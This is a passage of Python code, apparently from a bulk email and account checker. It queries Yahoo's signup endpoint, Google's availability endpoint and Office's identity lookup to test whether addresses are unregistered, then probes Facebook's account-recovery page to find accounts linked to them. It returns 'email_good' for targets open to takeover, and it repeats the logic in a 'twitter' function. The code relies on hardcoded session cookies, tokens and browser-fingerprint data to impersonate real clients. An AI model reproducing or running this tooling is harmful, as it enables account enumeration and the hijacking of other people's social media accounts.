2hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1657415199200%2C%22render%22%3A1657415200314%7D%7D&specId=yidregsimplified&cacheStored=&crumb=V0Pr4B6tQHi&acrumb=0sHA17fo&done=https%3A%2F%2Fwww.yahoo.com&googleIdToken=&authCode=&attrSetIndex=0&specData=3qiYX%2FHBcI%2F%2BhrvMxYBXgXQb1%2FYAeMSHZmV4MqgmhqN1URqj%2FsjgTGrzl4FYAaAL1UczLgsaT4rm7Cq3BXusOpCF83nfWay%2BC4rhWCth8rBob6OT8S9v0s7KQfuZoeXmPP0NCJxRHjiKlQBmUepkdKTRtym7LERXeBITKc8qTL15f6Vb9O1yc3ZBETBW%2FOpt6%2FNdXvTgPh8z9rX4CcDlWyjVuO2KusJUgIe2sQ%2BSs7EOIYSCVcNUAOqCtXAFkLyS%2FwtNW9ew2r%2BdkiOEmXXi2Akg3YFs3tNskYHR8cTvqHvpf9mEeGwYDCg0%2FGzQybLfG9um3opaS%2Bvnkz19nTE2jfxnlgudhbhKSkg5b4I3WA7tiQh%2BfdpkINdYrPRYXa%2FbQO47iWX9XnSJm536xRWWqrirGNYme3ZP%2FkbEHdsOCRN59fCXf9GEj0GSdIOYs2OI%2FgcOEl%2BQAV3uH0Dg8OZC0Cm9Nrk%2FYJTIntesxVHvpI5qGAYMr8sR47yrUHuZCahwj9T8tJob%2BJh7cKO1rw83V07K4zwiBSzeQyxbKKj%2BoaUK6tDYVCsS0nsPl9YYzNakW4V6hLVHiMlIwrqdSaaqyD%2FpkWwIZon33c6ulzzRogLES4lZi%2B6Y1I34QbnRs1M1%2Blag9xNYAhe2ysOQWsbec5F2vJaYY941UzlAEH5Z2aoCAgUchjmfRvAqwD3J%2FKlAmwATVMjlgwYwiGZb%2Bc6XIyzGV0P4iq%2F0h8mvJaBqloH%2Be8G%2BOApb2ybaGWor1R1RCt5oHPvbi5pcXhv895j3Pf8R%2BzuCxZu%2F2fLWCugzT4auXfUEvQoR9cBsQxKBe%2Fiw6eo78VzExH9qBh2kpEqtjy1LkHzoh24mn%2FTykqvPMu6cOtu0ZNv%2BCQVEXhER%2BLiZmHqtkvc75fUK1ELu4lKpMitRu4%2BnYTf7saiWOVdn2gQgI2p%2FXU7iPBSxwEzabRpoVwb5wUymGZFsloAcLmBz0FuWtkoqfHzmJdQSZY1y%2BJqMKP30vK8Zy9%2F8RVMpvb859VdesnhF%2B%2B1lFWkfCal3tQNR%2FnN%2BScD4A9rDs1alXxvEpGjnXSpCQ569imLxX11pbaozUXipv4%2BG2WrhGGuTulBoeucBhkiTNf3r73WJfwRCCJCEyztLcYbl3x9P6ahKOjGKEdVDnVi4vGIi47A56jVoQn3QoHmahw6PsqlV4dhtd0u%2BYQ0s09rmFGABQjPdQaSddrB0g32WVOBdruFLeevg9bKRkZYOcr1AfWsuIqi6HaDiKCgomeNN0xB77B0lrwLyS6bW5iGTPP6a%2BlokF6YJKoIlh%2B3xVDWZ4%2Bjj3iEViHGJJA4hsLGy%2FN88eRNZ2RVo957EK3%2FE6vu0L4phnMCwMRxx7PVY2d3oHdGfyMpYFnHK1HRhWspF6PbLoz1jewpUPtuUXmA8qtphATgd4GpwugPQJq6L6n1RFRnHd8WrazHf1HxSO1cZObRYDFPwwR1TK4RkS%2FCoHMePTwNFgy85Z%2FDZ3QYKGhQ8himvoLFH9yLpERLhvS7n%2BV%2BXBJhEOUEDqrTgzf87BX2qI5pKB8P1SZelaAgUU3cXMqxo3et1yxlXaeOptj3K6QrZHs%2BjfTWp5rSVCQ7lj%2BFVql1JChhIU7t0E6h0Y73%2Fy%2BSfnUUtLrjySQQD1vHE%2F6eZYQUHUnz7bYj88EVQZ4e8LAYJvh62gYgoHNIHnk%2Bsa18Q3OUVhcCRqaO4XIiUCWXWaMa8TC7OWOicicC7C73mfEapdQoRpacErL5cDj0lVU%2FkSO31BukbIJ3qXArWnB6xHoBG2L%2FJnwURub4U0e65qB3cAnFe1z%2Bu9SIYRQtmEX%2B%2Fb91mI%2F06XMQd3YrYv%2Bod2sTCVHbpiUXe6vR%2FG5edhHiGB53aMuHX1ljEB711okyoJOViTHu1Fuf4pLhvDSZyOeHBqqX5qj%2FsNjoyZGI1o04O%2F2u%2Bo%2BJMy5YvVVRd8ALRgcpOkqdG9KuT00t1b7R5J5TKKxwUbqMKnkUHGbHi3hA9rHD6Kqn7nfFNvzLmFvA7aN4mFbGy8SncJ9O6MBofHhFnPkhC%2FZdxkYtjDAtSRE9AVNvxEbbGHhqhKBJFaDn%2F2zbK1OqAyC1Wy7rjD7bzYZT3RFKprvz4Dp1SZO732C6%2BcEStFzKt1hK%2FzXDidbZz6bgRhasGBzT2m5ty1F8Y9VCUeIcDbhzkcsztEsqjTbgF1VHJvuxAPo14nDI%2FCHcGCOX7aHSXH4U7G0YFH7O09NruPxcR40KCfO%2FF8eQ%2Bd4ovBGb1SW%2F4wcJ9pWzPKS4XUQ5xSlitdekid5nyDTSEIODfW2vLufF9Da%2BFuj87kH0TtBcM0SR7d5XfYAMA1OOmzOt35LCJGFgF%2F3xyLZv1ghZT%2Bx28qC8fZ7V%2FVnH3uYrVM1S%2FIN71UZRS%2FUK6Cq9bVLrRfGSRqAYlpSalBB8squ%2BsGQ%2FrhLtu6J29Ttg0N1wHovjPX9kPgqsVCcYTIrUE0PcZDw%2BGd5EUiyBNF6HZ4oAMafvj5snS9gLIhIcG82aEhwIfiBR9Rwm%2F%2F7hGq5REIesblFcPIszNvXHr8Prb4xetLLmTYlLxHa9FhoiUG3HxbTJFxSPdc03x9h0665awOppQ4YxAQHjcxOrrzjxhrcZH2TL7DAJZS7F%2FpQae11m00SYVMbufIUT5rCqGf1Kc1zLEbVbEksEgsJ3I3xsjexEUPD9tuDOA5KzqfKBGG3jNbuSrfVcVgk6s9bsGRifmYPbk5ahcXu3c7ekuPG72VDVSaS9kpIFMyVDzQV%2F%2BFdK1vIC48pyZXyVNStS6KxQbKj8CkexdqxJwlV1JpRL8sFYb6o0L%2FMJNL%2B2GMVToSJXCqiM0BaBfvBIae2dIhs2tvZlui7IIUdUAQkwAMjjL9LN%2BvIgdoVtCupTMD3TUqTDfU1Cg0C3K98xi5mfeGP6JJwoSlztXIGDuM4EL%2FnSthWs9gniCkxA36e%2F6zW%2FioH0BKVMFanLjjBRUbaKSdVxtQiJYZ6wiYGJhm%2BTGCPMQG2JLlDj4bJeiNCe8wFzDEDUSL8Q65FLSCcZc9UQBxzSSpeIzCSFT4sY%2Fy61Nr%2BgPgBC36PGOx7M0rPPeeU1ePluevsUiXMhcAl7eayJnr5tG1iqRa%2FFSf5jhEaWM7eC10Ey7iAiNDvtxzoSFRqjnEAADD%2FPzhUmcBJdowhE4Y4YBRB81pIgWFgbuhD31Cnfl93n1UBSPEdvR%2B9acYSeFhLoJFkYIjDzwxi9sjp8ik9wUwk70ff9aJRrkfQRWDliWDaJA2um0X%2FYxazTvk6UYJ9du01kePKT%2BUs8fpulOJhEUi2U02ZyqVwpgeoQmdGrztvt9v7U5vICRNpXm3sdcx8bfkvFMRGsUoxPM%2Fxnla9yal2ZtkWPOltctM%2FmdkJtlBvHjffRBOV9CRHP0b7fIZAGFFh2qQbvkRrf53cQQG3OIM5d5AdtiC7769vQ1uKtciUcAmngVpQfMqXBdSgSA5xG1nKfxyZO9oTGIGlf5xJ9lCdoQdLuyJlR6ma5ro29HzqO%2FelrWrajXYFRMqb0jfbMTZiV0hyZpb8Whu6r5KEQ4i2iyZXrMu%2FKXN1LntbdD8%2BHRBQITCt3hvqkk0D%2BU8e1LGceaHsUyVOKx3KN%2FeH3iUAYX4LhP7QKylegSCMX8ujZMyQarDnJmUhdtdVTpqZuskfC3U%2BFuqcV1ueLwy7i7nwlnJR916wpBEKzJxuu5W4XY1xl295AAkrqQ1w3dQD3Y1RmzbHptQooybc87d4P%2BP48djTkXjk5%2BtzQza31zuVMYeXCEOveFDLjhCWJ%2FEfVo4om0PcaQMJ8rIJcwRPbBCHJHPny%2Bp5IjImeGDscr7NZfj6Rxs9a7BzbRv6sSZitlQrzasw8T5XHIglPVLX9qT1uvUhey%2FETHBTZS%2Fy4CyfIwCBgi7TV4L%2FY0D49DyWNvf9TUP4f%2FxP7fPw0MbUkf16e8fzUE2tkvkeeoYzyXkU5Oe9JSS6c2Jfwo%2FFRTB5K75JNwdog8sebO1NyXRVjJlaoS4SgnVJk5Aix2NUPMcIJU5MmYji0gKu1A6QSODbRtXhmvyd8b1FwRv1MWCSmUHfbkZYxLE6GDO24gaYyrwp0h7ahYC55bti4QrVpPDCcGEj7cUBtzUcLMT2MJOXsfjsAbRsRxBW%2BeMOpMhdnEDTFkNIbUPsmzzrMaUu7Y%2BUAfap639tZUe%2FbNqgibgye2KhlXPS%2FTGtxUGsDZqVBCW03N%2FWahUWhtLKp7KJnutk9otzkZ07VHReV1x3fblTYgS59RSPXwUGY97wQCpSbCFpL7xISbzM0SoAegHDQYy09MtD1vfhfDeEZHyR%2FFCt0YLWvIRVoA8A2K5xWUMmPrd657A2gGKeT0%2FthL%2FZpHTSOLLd5RA9VTKXNVu3xE%2FF0OKQ1HTp4p35M4FJV6eheJOiPgcU1BMuZKMXCXf7x0bpCevEXIeSYaD8pQJHLPXyCj%2BpWzjzNdBhOjbtSdloonEyHvrm19UB10QxDR%2B2fMLKJIDKQJtgYFjQhXGUxGpEmPTQ0uekJZ48ej2Gji1tqWlseMOMipg0S1Rgta7MWQQ3EL88J7u9PJf9soLTOaf7Pqqs%2BobulcEsjxv9aPwILr15ZMfdspWg%2Btx8%2BN5b%2B0uYMSwh%2FOdeMCHS8DONFUKN%2BI8ln3tV0kFaqPNNdHTbwJzbPv1a0Y7v%2FCaqPOoAqXPwpUxmI%2FzgQtCgJ91Raj%2F%2BPNzxDn6JxE7nUIo1X%2BjUwerAkQ2Dygy8Fho%2Bw1BYfihj03CZhjS1krj8Vd04aQabeKSZVzdjfCdpkfzwFHfi77iq6vKPHsQmsZadPFf6aXVazYE6SrXj4RRbaoBsW%2BtJ9PGpu3En9CgvKk9JrArFBq4qRM56H2C%2FwIoUQxYEFQgxiB9RYZMF1ZHmTluTqYOak6GO%2Fw7D%2FZjhBWtnBlpTbMafcrExzCy0YuUklTs5v3gQ6uMdvpWo60FlSd4TBhgRu%2BoyOMzxC2U7swA8JqWlfnvrlX0NmrSYKNHzloPAfpXINg7IR4%2BP2vdHHyEu%2FdymeKI4b3cS8fEDC%2BIr4D%2BfXa1edNyqPdFIFmvKGZeVRDuIXNXM%2BjZLLAD7R8Pw%2FRXC5X%2FgGXX01HU4Ma7vPcIcoUY0HpYRohxZHbuvlCxlbj6MMteOXJJPtgiN7z%2BjC6eyognmaE%2BWWeg4uemCw8mw0Ld2mKorywvWbu4DvOBaXuivqtDfkH5b%2BQstz493hTZ5ovVuAssLygF6US%2FFabYr3KxoyEjmhYpvsA45wctYfcjmFwdf1QT2wQz%2FOoskWn1fCsGKCU6OCb%2BHBCQa5KCSN5y%2FNpOWXUIyB3Z5jQXrs3%2F%2BcWGRkm6fDXJHiASkDuhaJuhg%2BHXaFPTGouoi%2BDpseLIE6QDjIhgVsm2WKIlTJfAekOEQMW8IPzFjABJrdWgZg08BqHIwFTSoMgz6DCT3xP%2BpCZE9xkzXCsPKgtvjqAyVrc8rQWvC2XznQYahjmw%2FTPz10lDVAlH41I8XP132BqPUv5jy3tmjQTFeIkbfH%2BQoe2HN4rHa07AwLHP6Y0gDQqIkbY4lPUoHNPeS6jVXnb6d%2FGFRl8tTKg4QCEaZX3lwzjjXXVAlmz%2BZ0wc1jGXRclTPTNnR%2BvklAjqPIypAz%2BR9tx4rLe5jHLXuCy0LHuIdb5OLrCF%2Fgr1MCywGJHpNao4oeukqk6OPPtFN8eYplJy8tnNwoJSsoNrXR1iNFIt%2F3VZRtgOQvrGQ7x0AXwvVqX6Vt%2BYzQ3WWQdu%2BBI9CsFPE7IX4Ek1ZJ97r1%2BREvommgXkRii4pYbZPEGbkgVMcI42x94LtVEM2ZXqsJyAaQY9rX7bsSAahgp3udxAGzoa%2FjTs6tW1oD6sBin1kcjElZbkBI80DCV2rka9LDImH9ZM7NDDU6leamdb2oJCAmB1YMXozgIV5kpMgbVr1%2BdAPuJX3lKyk9kWI9VrBCtmMo%3D%7CjUP9j77GikcMDQ84gY3nfg%3D%3D%7CIM7sEaFvNp%2BZ6Fsp6b915A%3D%3D&tos0=oath_freereg%7Cxa%7Cen-JO&firstName=&lastName=&userid-domain=yahoo&userId={email}&password=&birthYear=&signup='
      	p = {'validateField': 'userId',}
      	response = requests.post('https://login.yahoo.com/account/module/create', params=p,cookies=cook,headers=headers, data=data).text
      	if 'userId' in response:
      		return 'bad'
      	
      	
      	else:
      		
      		cookies = {
      			'datr': 'DSwzY-nfI4DiOY0Bv5jQ4yM3',}
      		headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'ar,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
    'cache-control': 'no-cache',
    'origin': 'https://mbasic.facebook.com',
    'pragma': 'no-cache',
    'referer': 'https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=1&alternate_search=0&toggle_search_mode=1',
    'sec-ch-ua': '"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52',
    }
      		params = {
    'ctx': 'recover',
    'c': '/login/',
    'search_attempts': '1',
    'alternate_search': '1',
    'show_friend_search_filtered_list': '0',
    'birth_month_search': '0',
    'city_search': '0',
    }

      		data = {
    'lsd': 'AVoSgLkxDoo',
    'jazoest': '21042',
    'email': email,
    'did_submit': 'بحث',
    }
      		response = requests.post('https://mbasic.facebook.com/login/identify/', params=params,  headers=headers, cookies=cookies,data=data).text
      		if 'لم ينتج عن البحث الذي أجريته أي نتائج. يرجى إعادة المحاولة باستخدام معلومات أخرى.' in response:
      			return 'email_good'
      		else:
      			return 'done'
      		
		
      		
      
      
      
      
      
      
      
      
     
      
      
      
      if domen == '@gmail.com':
          url = 'https://android.clients.google.com/setup/checkavail'
          headers = {
				'Content-Length': '98',
        'Content-Type': 'text/plain; charset=UTF-8',
        'Host': 'android.clients.google.com',
        'Connection': 'Keep-Alive',
        'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)',
   }
          data = json.dumps({
	          'username': email,
	          'version': '3',
	          'firstName': '3mk',
	          'lastName': 'Coder' })
          res = requests.post(url, data=data, headers=headers).json()['status']
          if res == 'SUCCESS':
            cookies = {
      			'datr': 'DSwzY-nfI4DiOY0Bv5jQ4yM3',}
            headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'ar,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
    'cache-control': 'no-cache',
    'origin': 'https://mbasic.facebook.com',
    'pragma': 'no-cache',
    'referer': 'https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=1&alternate_search=0&toggle_search_mode=1',
    'sec-ch-ua': '"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52',
    }
            params = {
    'ctx': 'recover',
    'c': '/login/',
    'search_attempts': '1',
    'alternate_search': '1',
    'show_friend_search_filtered_list': '0',
    'birth_month_search': '0',
    'city_search': '0',
    }

            data = {
    'lsd': 'AVoSgLkxDoo',
    'jazoest': '21042',
    'email': email,
    'did_submit': 'بحث',
    }
            response = requests.post('https://mbasic.facebook.com/login/identify/', params=params,  headers=headers, cookies=cookies,data=data).text
            if 'لم ينتج عن البحث الذي أجريته أي نتائج. يرجى إعادة المحاولة باستخدام معلومات أخرى.' in response:
            	return 'email_good'
            else:
            	return 'done'
          else:
            return 'bad'
        
        
        
        
        
       
      
      
      
      
      
      
      
      elif domen == '@hotmail.com' or domen == '@outlook.com':
      	url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
      	data = ''
      	headers = {
	"Accept": "*/*",
	"Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    "Connection": "close",
    "Host": "odc.officeapps.live.com",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
    "uaid": "d06e1498e7ed4def9078bd46883f187b",
    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
      	html = requests.get(url, data=data, headers=headers).text
      	if 'Neither' in html:
           cookies = {
      			'datr': 'DSwzY-nfI4DiOY0Bv5jQ4yM3',}
           headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'ar,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
    'cache-control': 'no-cache',
    'origin': 'https://mbasic.facebook.com',
    'pragma': 'no-cache',
    'referer': 'https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=1&alternate_search=0&toggle_search_mode=1',
    'sec-ch-ua': '"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52',
    }
           params = {
    'ctx': 'recover',
    'c': '/login/',
    'search_attempts': '1',
    'alternate_search': '1',
    'show_friend_search_filtered_list': '0',
    'birth_month_search': '0',
    'city_search': '0',
    }

           data = {
    'lsd': 'AVoSgLkxDoo',
    'jazoest': '21042',
    'email': email,
    'did_submit': 'بحث',
    }
           response = requests.post('https://mbasic.facebook.com/login/identify/', params=params,  headers=headers, cookies=cookies,data=data).text
           if 'لم ينتج عن البحث الذي أجريته أي نتائج. يرجى إعادة المحاولة باستخدام معلومات أخرى.' in response:
            	return 'email_good'
           else:
            	return 'done'
      	else:
      		return 'bad'
      	
      	







def twitter(email,domen):
      global bad,done,block
      
      
      if domen == '@yahoo.com':
      	headers = {
			'authority': 'login.yahoo.com',
		  'accept': '*/*',
		  'accept-language': 'en-US,en;q=0.9',
		  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'origin': 'https://login.yahoo.com',
      'referer': 'https://login.yahoo.com/account/module/create?intl=xa&specId=yidregsimplified&context=reg&done=https%3A%2F%2Fwww.yahoo.com',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
}
      	cook = {
			'A3': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
		  'A1': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
		  'A1S': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc&j=WORLD',
		  'AS': 'v=1&s=0sHA17fo&d=A62cb7327|5xRp8pr.2UJmOAqR8uAJglbFObbsH8uOznbuKM00ySlD8Ha.X4jNUXo4VEjGrKs97pN8kPAqzIf1jQcTQp5veb991hp7CXQa18n8eMvtp0i3TKdzY_snYqc41YJj1lVf5YXbOhZFbUgbZ2.BI5VJuQoxc9BfU6gFuHcokkx86DndLRGqMpFyzmFeAViTx6LSbPs2soSDVxJyEtCeBln32VP6QDigRPlUzpL8mrluwSF4NXjjJg3kpS308GYePy96Pznh3CvVja7A0RUIQanRzwQWoKX7u3c5Kgak5jZEasYEQHnqWNCzZXZn5j7BKRKruJ3nhcjBB0BD7YCmViG7NYR1QnbCOntbcWVTvhgr3v7fYIg5cx93ChX3TrMiqfnj.h35U2rNdLWlilATg3BEysTnYSjSIsKcQYnA4C9vzP8Db7tHidwbS1cCjttg.aOyemeymvsE2Y_FsfkK4Qeqx6b0cwqrM7IqzCp0vQp5I_87QmIk8boy4dYeyswIGcdnkLJb45mKMh3DsI5vMN7xyTRhJYO7JVMisaK0Zw8EyrG8z8hCgnozUBv3LpyJjxqbGQGcNBkvn7lhWZgLvsNoBUgVaTEYw5UC0aG7QCh2U7KF9qvv9O0CMZor7aubtx3Z.7SKZVAo7f1yPc4huhhlghkzbNn4BQBL0Fx0dEjQ3Df54gjiOVp5AcJlGM9qlkjbIMDQlg2n_LDedAwQgRoyvPxyrP.Tvqua0OFVi_LUaamtbNsS1SgmJTKobw2K3R39VKy9gcA0vieC9MvgkXQI._E_vz1BtEav0E6RsD2cD.k9j0Jw2brizvfy1wfr6vWoC1bqTMwiEzNGjsX0ug9Yf.yzteWwiWeIAbBG5aSyw9r4O_D9AIig62YIj6y5ERN1msWLRSFv3Dj.ExQ2ek7xuSeN7qW5EIh.4Pnvbm1WNv1TXVuw23WA7HV7WtEiOkfFDs5DvjhLX4MIU_Bt.gpZAcg89Yg-~A|B62cb779f|5f1yTBf.2Tq2W7LQ3KsSFbticESMze16y.0N0bOBd_EFQ_q1.moN9y.T_Vf0mwzJRub.9SzesA7Pzge4dwE_n84Jwg31ipQlUd7uIpky29J0EB2spihP_9ukbwI3MhWdMnds18q42N5ajt9kgn10vdAx5Fp9sNFAbXVl0op1I9bNGrfuz_4_P.a8Eoak702B2ebotX0YdNYct.IJ66Qfd8D.3g1ymlmnHxr7Y2IwJYCg15oQyQBeF8Z7DNW8_kZrP1s6dSZpd75ZI6wro_Rwh2ubvUely.oxpRFUTM2Vlh_VxnvDBDkBPaUC6OO0POVyPIbbCYKUWCVKcMQ_iVYhT.Nh0hntrcppxtz4BVp0rB6jAeb8nc0CrwSFRXP4uo8ICcsK22LsRqH7GWqqpQgrgZC51xJoFGph.Z4ZIX8fMu80u4Eh7lVx4emSGoO3UfrvvkL1RFWxHBfnSxeTmc3dYdPIpJj18qWQShVerqs1UcsB7Hxh67QTx1d2VqqKH9y044pHa55bjeSRnOkIYdHYv2us5rQSEw_04BBRBPAgbSnWrl9COJvpVTVeMF6ykV1.TJzQCKltU4uRTKiQIKfy9vGJuiKjwjFc7h1V5S9Y8Jd69EaDEb1XCaeOAruPYJqc9MINCeycUQFqhxUoHKUORcK9RV_9EINbPwgiB290jhdk3mEffmVI8a8RCcIpiW5dwUCgMkrBb90ebetwP_I9I5fke_USUYS3KtIsOq7L8APsJ4lCmwOdfAPm9OWyLz20bOdk0CidwpDFrqqxQt2JfUe_oyJB8FdZRfmcGmvjrnZm6blzGzUbFnxxJ.5ydhPjmf345BXcxnS3E.U0emkN4Wc0V.xzM_hkQh.oCeqWzSqf15eHZRSoLUusEUA.31Md9l67W_lNcQ.6nASTIWxr_q0l8jjGSGyiyJY-~A',
}
      	
      	
      	data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A420%2C%22timezone%22%3A%22America%2FLos_Angeles%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%203000%20Direct3D9Ex%20vs_3_0%20ps_3_0%2C%20igdumd64.dll)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1657415199200%2C%22render%22%3A1657415200314%7D%7D&specId=yidregsimplified&cacheStored=&crumb=V0Pr4B6tQHi&acrumb=0sHA17fo&done=https%3A%2F%2Fwww.yahoo.com&googleIdToken=&authCode=&attrSetIndex=0&specData=3qiYX%2FHBcI%2F%2BhrvMxYBXgXQb1%2FYAeMSHZmV4MqgmhqN1URqj%2FsjgTGrzl4FYAaAL1UczLgsaT4rm7Cq3BXusOpCF83nfWay%2BC4rhWCth8rBob6OT8S9v0s7KQfuZoeXmPP0NCJxRHjiKlQBmUepkdKTRtym7LERXeBITKc8qTL15f6Vb9O1yc3ZBETBW%2FOpt6%2FNdXvTgPh8z9rX4CcDlWyjVuO2KusJUgIe2sQ%2BSs7EOIYSCVcNUAOqCtXAFkLyS%2FwtNW9ew2r%2BdkiOEmXXi2Akg3YFs3tNskYHR8cTvqHvpf9mEeGwYDCg0%2FGzQybLfG9um3opaS%2Bvnkz19nTE2jfxnlgudhbhKSkg5b4I3WA7tiQh%2BfdpkINdYrPRYXa%2FbQO47iWX9XnSJm536xRWWqrirGNYme3ZP%2FkbEHdsOCRN59fCXf9GEj0GSdIOYs2OI%2FgcOEl%2BQAV3uH0Dg8OZC0Cm9Nrk%2FYJTIntesxVHvpI5qGAYMr8sR47yrUHuZCahwj9T8tJob%2BJh7cKO1rw83V07K4zwiBSzeQyxbKKj%2BoaUK6tDYVCsS0nsPl9YYzNakW4V6hLVHiMlIwrqdSaaqyD%2FpkWwIZon33c6ulzzRogLES4lZi%2B6Y1I34QbnRs1M1%2Blag9xNYAhe2ysOQWsbec5F2vJaYY941UzlAEH5Z2aoCAgUchjmfRvAqwD3J%2FKlAmwATVMjlgwYwiGZb%2Bc6XIyzGV0P4iq%2F0h8mvJaBqloH%2Be8G%2BOApb2ybaGWor1R1RCt5oHPvbi5pcXhv895j3Pf8R%2BzuCxZu%2F2fLWCugzT4auXfUEvQoR9cBsQxKBe%2Fiw6eo78VzExH9qBh2kpEqtjy1LkHzoh24mn%2FTykqvPMu6cOtu0ZNv%2BCQVEXhER%2BLiZmHqtkvc75fUK1ELu4lKpMitRu4%2BnYTf7saiWOVdn2gQgI2p%2FXU7iPBSxwEzabRpoVwb5wU